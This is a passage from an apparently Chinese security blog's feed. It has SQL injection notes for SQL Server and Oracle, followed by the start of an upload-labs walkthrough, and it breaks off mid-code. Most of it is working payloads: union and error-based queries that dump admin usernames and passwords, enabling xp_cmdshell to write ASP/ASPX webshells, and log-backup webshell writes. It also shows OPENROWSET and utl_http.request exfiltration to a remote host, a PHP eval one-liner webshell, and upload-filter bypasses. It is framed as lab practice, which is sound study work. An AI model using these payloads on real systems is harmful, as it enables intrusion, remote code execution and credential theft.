src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526211850.png" alt="image-20210526211844284"></p><p>第一个 2 ,3 为字符串 1为整型</p><h4 id="查询系统信息">查询系统信息</h4><p>db_name() 数据库名</p><p>@@version 版本信息</p><p>User_Name() 当前用户</p><p>host_name() 计算机名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1&#x27; union select 1,db_name(),@@version --qwe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210526212030.png" alt="image-20210526212023937"></p><h3 id="SQLserver-报错注入">SQLserver 报错注入</h3><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">显示系统信息</td><td style="text-align:center">and @@version&gt;0</td></tr><tr><td style="text-align:center">爆出数据库</td><td style="text-align:center">and db_name()&gt;0</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:center">and User_Name()&gt;0</td></tr><tr><td style="text-align:center">爆出其他数据库</td><td style="text-align:center"><code> sqland (SELECT top 1 Name FROM  Master..SysDatabases)&gt;0              and (SELECT top 1 Name FROM  Master..SysDatabases where name not in ('master'))&gt;0            and (SELECT top 1 Name FROM  Master..SysDatabases where name not in ('master','iNethinkCMS','model','msdb'))&gt;0</code></td></tr><tr><td style="text-align:center">爆表</td><td style="text-align:center">and (select top 1 name from  [mydb].sys.all_objects where type=‘U’ AND is_ms_shipped=0)&gt;0                                                and (select top 1 name from  mydb.sys.all_objects where type=‘U’ AND is_ms_shipped=0 and name not in  (‘admin’))&gt;0</td></tr><tr><td style="text-align:center">爆列</td><td style="text-align:center">and (select top 1 COLUMN_NAME from  mydb.information_schema.columns where TABLE_NAME=‘admin’ and  COLUMN_NAME not in(‘ID’))&gt;0                                                                                                                                                                     and (select top 1 COLUMN_NAME from  mydb.information_schema.columns where TABLE_NAME=‘admin’ and  COLUMN_NAME not in(‘ID’,‘username’))&gt;0</td></tr><tr><td style="text-align:center">爆数据</td><td style="text-align:center">and (select top 1 password from admin)&gt;0                                                                                                                                                     and (select top 1 username from admin)&gt;0</td></tr></tbody></table><h3 id="sqlserver快速爆表列数据">sqlserver快速爆表列数据</h3><p>在 SQL_SERVER 中 每个数据库中都有 视图-&gt;系统视图 在这个下面都有很多关于这个库的表，表里面存放了很多关于这个库的信息。 COLUMNS 列 TABLES 表</p><table><thead><tr><th style="text-align:center">内容</th><th style="text-align:center">命令</th></tr></thead><tbody><tr><td style="text-align:center">爆出表</td><td style="text-align:center">and(select TABLE_NAME from  information_schema.TABLES where TABLE_SCHEMA=‘dbo’ FOR XML PATH)&gt;1</td></tr><tr><td style="text-align:center">爆出列</td><td style="text-align:center">and(select COLUMN_NAME from  information_schema.COLUMNS where TABLE_NAME=‘admin’ FOR XML PATH)&gt;1</td></tr><tr><td style="text-align:center">爆出数据</td><td style="text-align:center">and ( select username,password from  admin FOR XML PATH)&gt;1</td></tr></tbody></table><h3 id="sqlserver执行系统命令">sqlserver执行系统命令</h3><p>在 SQLSERVER 中是可以执行多行操作的</p><p>两条 SQL 语句是用分号隔开</p><p>select * from art; select * from admin</p><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。 如果用户拥有管理员 sa 权限则可以用 sp_configure 重新开启它</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure </span><br><span class="line"><span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>命令解释</p><p>EXEC sp_configure ‘show advanced options’,1//允许修改高级参数</p><p>RECONFIGUREEXEC sp_configure ‘xp_cmdshell’,1 //打开 xp_cmdshell 扩展</p><p>RECONFIGURE</p><h4 id="执行系统命令">执行系统命令</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master.dbo.xp_cmdshell <span class="string">&#x27;ipconfig&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="开始-xp-cmdshell">开始 xp_cmdshell</h4><p>;EXEC sp_configure ‘show advanced  options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>getshell</p><p>;exec master…xp_cmdshell ‘echo ^&lt;%eval  request(chr(35))%^&gt; &gt; C:\inetpub\wwwroot\www.demo1.com\2.asp’ –</p><p>exec master…xp_cmdshell ‘echo ^&lt;%eval request(chr(35))%^&gt; &gt;C:\inetpub\wwwroot\www.demo1.com\2.asp’–</p><p>exec master…xp_cmdshell ‘echo ^&lt;%@ Page  Language=“Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],“unsafe”);%^&gt;&gt;D:\2.a spx’ –</p><p><a href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> master…xp_cmdshell ‘echo ^&lt;%@  Page Language=“Jscript”%^&gt;^&lt;%eval(Request.Item[“chopper”],“unsafe”);%^&gt;&gt;C:\inet pub\wwwroot\www.demo1.com\2.aspx’ –</p><p>执行系统命令 把命令结果输出到指定文件 <a href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell  ‘ipconfig &gt;&gt;C:\inetpub\wwwroot\www.demo1.com\ip.txt’</p><p><a href="http://www.demo1.com/index.aspx?id=1;EXEC">http://www.demo1.com/index.aspx?id=1;EXEC</a> master.dbo.xp_cmdshell  ‘whoami &gt;&gt;C:\inetpub\wwwroot\www.demo1.com\ip.txt’</p><h3 id="sqlserver备份拿webshell">sqlserver备份拿webshell</h3><p>&lt;%execute(request(“a”))%&gt; 差异备份 经常会出错的 不稳定 log 备份一句话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp</span><br><span class="line"></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> test_tmp (a image);</span><br><span class="line"></span><br><span class="line">;backup log mydb <span class="keyword">to</span> disk <span class="operator">=</span><span class="string">&#x27;C:/phpStudy/MSSQL/WWW/asp.bak&#x27;</span> <span class="keyword">with</span> init;</span><br><span class="line"></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> test_tmp (a) <span class="keyword">values</span>  (<span class="number">0x3C25657865637574652872657175657374282261222929253EDA</span>) </span><br><span class="line"></span><br><span class="line">;backup log mydb <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;C:/phpStudy/MSSQL/WWW/123.asp&#x27;</span></span><br><span class="line"></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> art <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;IF <span class="keyword">EXISTS</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;test_tmp&#x27;</span>)<span class="keyword">drop</span> <span class="keyword">table</span> test_tmp;<span class="keyword">create</span> </span><br><span class="line"><span class="keyword">table</span> test_tmp (a image);backup log mydb <span class="keyword">to</span> disk </span><br><span class="line"><span class="operator">=</span><span class="string">&#x27;C:/inetpub/wwwroot/www.demo1.com/asp.bak&#x27;</span> <span class="keyword">with</span> init;<span class="keyword">insert</span> <span class="keyword">into</span> test_tmp (a) </span><br><span class="line"><span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253EDA</span>);backup </span><br><span class="line">log mydb <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;C:/inetpub/wwwroot/www.demo1.com/123.asp&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="sqlserver-openrowset-转发利用">sqlserver openrowset 转发利用</h3><p>适用于盲注入，页面不返回信息 使用这种注入方法，需要一台带有 sqlserver 的机器。 原理就是把当前数据转发到远程的 sqlserver 上。</p><ul><li><p>启用 Ad Hoc Distributed Queries：</p><ul><li><p>;exec sp_configure ‘show advanced options’,1 reconfigure</p></li><li><p>;exec sp_configure ‘Ad Hoc Distributed Queries’,1 reconfigure</p></li></ul></li><li><p>为了安全使用完成后，关闭 Ad Hoc Distributed Queries：</p><ul><li><p>;exec sp_configure ‘Ad Hoc Distributed Queries’,0 reconfigure</p></li><li><p>;exec sp_configure ‘show advanced options’,0 reconfigure</p></li></ul></li></ul><h4 id="开启扩展">开启扩展</h4><p><a href="http://www.demo1.com/index.aspx?id=1;exec">http://www.demo1.com/index.aspx?id=1;exec</a> sp_configure ‘show advanced options’,1  reconfigure;exec sp_configure ‘Ad Hoc Distributed Queries’,1 reconfigure</p><p>本地建立临时表</p><p>create table ##version (VERSION varchar(500))</p><h4 id="查询系统信息-2">查询系统信息</h4><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> into OPENROWSET(‘SQLOLEDB’,  ‘server=192.168.0.122;uid=sa;pwd=123456’, ‘select * from %23%23version’ ) select  DB_NAME()</p><p>执行上面语句之后 再来查询远程 sqlserver 上的表</p><p>select * from ##version</p><h4 id="两边创建临时表">两边创建临时表</h4><p>create table ##nonamed( dir ntext, num int )</p><p><a href="http://www.demo1.com/index.aspx?id=1;create">http://www.demo1.com/index.aspx?id=1;create</a> table %23%23nonamed( dir ntext, num int )</p><h4 id="查询路径">查询路径</h4><p>insert %23%23nonamed execute master…xp_dirtree ‘c:/’,1</p><p>向 nonamed 表插入 c 盘下路径的数据</p><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> %23%23nonamed execute  master…xp_dirtree ‘c:/’,1</p><p>这里就是把数据转发到远程 192.168.0.122 sqlserver 上</p><p><a href="http://www.demo1.com/index.aspx?id=1;insert">http://www.demo1.com/index.aspx?id=1;insert</a> into OPENROWSET(‘SQLOLEDB’,  ‘server=192.168.0.122;uid=sa;pwd=123456’, ‘select * from %23%23nonamed’ ) select *  from %23%23nonamed</p><p>在远程 sqlserver 执行这个命令 就可以获取 数据 select * from %23%23nonamed</p><h2 id="oracle注入">oracle注入</h2><h3 id="oracle-jsp-联合注入">oracle jsp 联合注入</h3><p>靶场地址:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">59.63</span><span class="number">.200</span><span class="number">.79</span>:<span class="number">8808</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="注释-2">注释</h4><p>– 空格  单行注释</p><p>/**/多行注释</p><h4 id="判断是否注入-2">判断是否注入</h4><p>and 1=1 –</p><p>and 1=2 –</p><h4 id="列数">列数</h4><p>order by</p><p><a href="http://59.63.200.79:8808/?id=1">http://59.63.200.79:8808/?id=1</a> order by 4 – qwe 正常</p><p><a href="http://59.63.200.79:8808/?id=1">http://59.63.200.79:8808/?id=1</a> order by 5 – qwe 错误</p><h4 id="联合查询-2">联合查询</h4><p>因为 oracle 对列的类型比较严谨 所以 要用 null 可以匹配任意类型</p><p>Oracle 中的 dual 表是一个单行单列的虚拟表</p><p>Dual 是 Oracle 中的一个实际存在的表，任何用户均可读取。</p><p>所以可以通过这个 dual 表 来显示列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">59.63</span><span class="number">.200</span><span class="number">.79</span>:<span class="number">8808</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual <span class="comment">-- qwe</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210608203818.png" alt="image-20210608203809773"></p><table><thead><tr><th style="text-align:center">当前用户权限</th><th style="text-align:left">select * from session_roles</th></tr></thead><tbody><tr><td style="text-align:center">当前数据库版本</td><td style="text-align:left">select banner from sys.v_$version where rownum=1</td></tr><tr><td style="text-align:center">服务器出口ip</td><td style="text-align:left">用 utl_http.request 可以实现</td></tr><tr><td style="text-align:center">服务器监听ip</td><td style="text-align:left">select utl_inaddr.get_host_address from dual</td></tr><tr><td style="text-align:center">服务器操作系统</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr><tr><td style="text-align:center">服务器sid</td><td style="text-align:left">select instance_name from v$instance</td></tr><tr><td style="text-align:center">当前连接用户</td><td style="text-align:left">select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:left">SELECT user FROM dual</td></tr><tr><td style="text-align:center">查询库名</td><td style="text-align:left">select owner from all_tables where rownum=1                                                                                                                                                   select owner from all_tables where rownum=1 and owner &lt;&gt;‘SYS’</td></tr><tr><td style="text-align:center">查询表(表名大写)</td><td style="text-align:left">select table_name from user_tables where rownum=1                                                                                                                          select table_name from user_tables where rownum=1 and table_name&lt;&gt;‘ADMIN’</td></tr><tr><td style="text-align:center">查询列</td><td style="text-align:left">select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1                                                                                                                                         select column_name from user_tab_columns where table_name=‘ADMIN’ and column_name&lt;&gt;‘ID’ and rownum=1                                                                                                                                                select column_name from user_tab_columns where table_name=‘ADMIN’ and column_name&lt;&gt;‘ID’ and column_name&lt;&gt;‘USERNAME’ and rownum=1</td></tr><tr><td style="text-align:center">查询数据</td><td style="text-align:left">SELECT CONCAT(USERNAME,PASSWORD) FROM ADMIN</td></tr><tr><td style="text-align:center">当前用户</td><td style="text-align:left">SELECT user FROM dual</td></tr><tr><td style="text-align:center">列出所有用户</td><td style="text-align:left">SELECT username FROM all_users ORDER BY username</td></tr><tr><td style="text-align:center">列出数据库</td><td style="text-align:left">SELECT DISTINCT owner FROM all_tables</td></tr><tr><td style="text-align:center">列出表名</td><td style="text-align:left">SELECT table_name FROM all_tables                                                                                                                                                                           SELECT owner, table_name FROM all_tables</td></tr><tr><td style="text-align:center">查询表所有列</td><td style="text-align:left">SELECT column_name FROM all_tab_columns WHERE TABLE_NAME=‘ADMIN’</td></tr><tr><td style="text-align:center">定位文件</td><td style="text-align:left">SELECT name FROM V$DATAFILE</td></tr></tbody></table><h3 id="utl-http-request-反弹注入">utl_http.request 反弹注入</h3><p>通过 utl_http.request 我们可以将查询的结果发送到远程服务器上，在遇到盲注时非常有用，要 使用该方法用户需要有 utl_http 访问网络的权限.</p><ul><li><p>检测是否支持utl_http.request</p><p>utl_http.request 页面正常 支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) -- </span><br></pre></td></tr></table></figure></li><li><p>反弹注入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$url and</span><br><span class="line">utl_http.request(&#x27;http://192.168.0.121:2008/&#x27;||(select banner from sys.v_$version where</span><br><span class="line">rownum=1))=1--</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#x27;http://域名或者 ip:端口/&#x27;||(注入的语句))=1 --</span><br><span class="line"></span><br><span class="line">注意|| 注意转码%7C%7C</span><br></pre></td></tr></table></figure></li><li><p>监听本地信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vvlp 2008</span><br></pre></td></tr></table></figure></li><li><p>查询oracle版本信息</p></li></ul><table><thead><tr><th style="text-align:center">当前用户</th><th style="text-align:left">select user from dual</th></tr></thead><tbody><tr><td style="text-align:center">当前数据库版本</td><td style="text-align:left">select banner from sys.v_$version where rownum=1</td></tr><tr><td style="text-align:center">服务器出口ip</td><td style="text-align:left">用 utl_http.request 可以实现</td></tr><tr><td style="text-align:center">服务器监听ip</td><td style="text-align:left">select utl_inaddr.get_host_address from dual</td></tr><tr><td style="text-align:center">服务器操作系统</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr><tr><td style="text-align:center">服务器sid</td><td style="text-align:left">select instance_name from v$instance</td></tr><tr><td style="text-align:center">当前连接用户</td><td style="text-align:left">select SYS_CONTEXT (‘USERENV’, ‘CURRENT_USER’) from dual</td></tr><tr><td style="text-align:center">日志文件</td><td style="text-align:left">select member from v$logfile where rownum=1</td></tr></tbody></table><h3 id="报错注入-2">报错注入</h3><ul><li><p>utl_inaddr.get_host_name()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure></li><li><p><a href="http://ctxsys.drithsx.sn">ctxsys.drithsx.sn</a>()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=ctxsys.drithsx.sn(1,(select user from dual))--</span><br></pre></td></tr></table></figure></li><li><p>XMLType()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is</span><br><span class="line">not null --</span><br></pre></td></tr></table></figure></li><li><p>dbms_xdb_version.checkin()</p></li></ul>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><ul><li><p>bms_xdb_version.makeversioned()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -</span><br></pre></td></tr></table></figure></li><li><p>dbms_xdb_version.uncheckout()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure></li><li><p>dbms_utility.sqlid_to_sqlhash()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure></li><li><p>ordsys.ord_dicom.getmappingxpath()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--</span><br></pre></td></tr></table></figure></li><li><p>decode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查</span><br><span class="line">询结果回显回来，仅是用来作为页面的表现不同的判断方法</span><br><span class="line"></span><br><span class="line">and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(1/0),0) from dual) --</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>报错 admin 表的 用户和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=utl_inaddr.get_host_name((select (select</span><br><span class="line">username%7c%7cpassword from admin)from dual))--</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;access-asp-手工注入&quot;&gt;access+asp 手工注入&lt;/h2&gt;
&lt;hr&gt;
&lt;h4 id=&quot;access-数据库&quot;&gt;access 数据库&lt;/h4&gt;
&lt;hr&gt;
&lt;p&gt;access 数据库与其他数据库不一样 他没有存储表的库，所以只能猜表。&lt;/p&gt;
&lt;h4 </summary>
      
    
    
    
    <category term="sql注入" scheme="https://www.dansemal.cn/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="sql注入" scheme="https://www.dansemal.cn/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="https://www.dansemal.cn/posts/80f02bc5/"/>
    <id>https://www.dansemal.cn/posts/80f02bc5/</id>
    <published>2021-05-19T14:59:00.000Z</published>
    <updated>2021-06-05T06:32:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建">搭建</h2><p align="center">  <img title="portainer" src='https://cdn.jsdelivr.net/gh/c0ny1/upload-labs/img/logo.png' /></p><p align="center">  <img title="portainer" src='https://img.shields.io/badge/version-0.1-brightgreen.svg' />  <img title="portainer" src='https://img.shields.io/badge/php-5.*-yellow.svg' />  <img title="portainer" src='https://img.shields.io/badge/license-MIT-red.svg' /></p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h2 id="Pass-01-前端绕过">Pass-01(前端绕过)</h2><p>准备php一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传一句话木马时提示</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508174932.png" alt="image-20210508174925579"></p><p>重命名后缀为png</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508175139.png" alt="image-20210508175133543"></p><p>在burp中修改为php</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508175131.png" alt="image-20210508175124122"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508180026.png" alt="image-20210508180018350"></p><p>连接菜刀</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508180224.png" alt="image-20210508180216841"></p><h3 id="用weevely-生成webshell">用weevely 生成webshell</h3><p><code>┌──(root💀B)-[~]</code><br><code>└─# weevely generate shell /root/1.php</code><br><code>Generated '/root/1.php' with password 'shell' of 774 byte size.</code></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640588798-be6b3cd54bf4534af40f8d27bd8c154a.webp" alt="image-20211227150628587"></p><h2 id="Pass-02-MIME绕过">Pass-02(MIME绕过)</h2><p>清空上传文件</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640676385-9d61eacdfddb1092dc2d8faa5bb421ed.webp" alt="image-20211228152615218"></p><p>修改Content-Type 为image/jpeg</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640676471-ea0d7bb90a1d4dac52f50baad901015f.webp" alt="image-20211228152747532"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640676571-d8cebe1f20195805eb189e430ddb743e.webp" alt="image-20211227150628587"></p><p>也可以如同01中操作上传成功</p><h2 id="Pass-03-apache解析漏洞">Pass-03(apache解析漏洞)</h2><p>上传文件发现报错</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</p><p>那么尝试修改后缀</p><p>如php3</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508182050.png" alt="image-20210508182044319"></p><p>发现php3 不解析</p><p>那么尝试phtml</p><p>也不解析</p><p>查了下 好像要修改配置orz</p><p>修改 /etc/mime.types中</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508184244.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 reload</span><br></pre></td></tr></table></figure><p>解析成功了</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210508184500.png" alt="image-20210508184452310"></p><p><strong>update</strong>-2021-12-28 15:54:41</p><p>不需要修改配置 <img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640678150-efef6ff0f6f41a1714f41491fd776dc0.webp" alt="image-20211228155547762"></p><h2 id="Pass-04-Apache配置文件-htaccess">Pass-04(Apache配置文件.htaccess)</h2><p>重写解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg&quot;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640850842-ecb0b84a4e6aadd4bbcbcc609f6d6b60.webp" alt="image-20211230155353215"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640851156-26ed2124f219d1715c12a4d9fe308002.webp" alt="image-20211230155913674"></p><h2 id="Pass-05-大小写绕过">Pass-05(大小写绕过)</h2><p>分析源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p>发现没有过滤大小写</p><p>尝试大写phP</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640851446-7f92b9410663caa6fdd07b577c6238cc.webp" alt="image-20211230160404192"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640851494-955e0f983860608c3ac38e8344d4425d.webp" alt="image-20211230160451045"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1640851543-3bc4374ca0db7ea0abc71586f69a1ddd.webp" alt="image-20211230160540374"></p><h2 id="Pass-06-空格绕过">Pass-06(空格绕过)</h2><p>源码过滤了大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span 